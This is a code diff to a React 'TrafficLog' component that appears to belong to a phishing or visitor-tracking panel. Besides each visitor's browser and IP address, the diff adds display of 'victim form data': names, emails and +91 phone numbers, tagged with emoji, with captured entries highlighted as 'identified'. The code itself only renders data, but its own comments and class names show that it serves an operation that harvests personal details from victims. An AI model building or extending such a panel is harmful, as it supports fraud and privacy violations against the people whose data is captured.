@@ -90,7 +90,7 @@ export default function TrafficLog({
                         displayEntries.map((entry, index) => (
                             <motion.div
                                 key={entry.id}
-                                className={styles.logEntry}
+                                className={`${styles.logEntry} ${entry.name || entry.email ? styles.identified : ''}`}
                                 initial={{ opacity: 0, x: -20, height: 0 }}
                                 animate={{ opacity: 1, x: 0, height: "auto" }}
                                 exit={{ opacity: 0, x: 20, height: 0 }}
@@ -108,6 +108,14 @@ export default function TrafficLog({
                                 <span className={styles.browser}>{entry.browser}</span>
                                 <span className={styles.separator}>|</span>
                                 <span className={styles.ip}>{entry.ip}</span>
+                                {/* Show victim form data if available */}
+                                {(entry.name || entry.email || entry.phone) && (
+                                    <span className={styles.victimData}>
+                                        {entry.name && <span className={styles.victimName}>👤 {entry.name}</span>}
+                                        {entry.email && <span className={styles.victimEmail}>📧 {entry.email}</span>}
+                                        {entry.phone && <span className={styles.victimPhone}>📱 +91{entry.phone}</span>}
+                                    </span>
+                                )}
                                 <motion.span
                                     className={styles.newBadge}
                                     initial={{ opacity: 1, scale: 1.2 }}
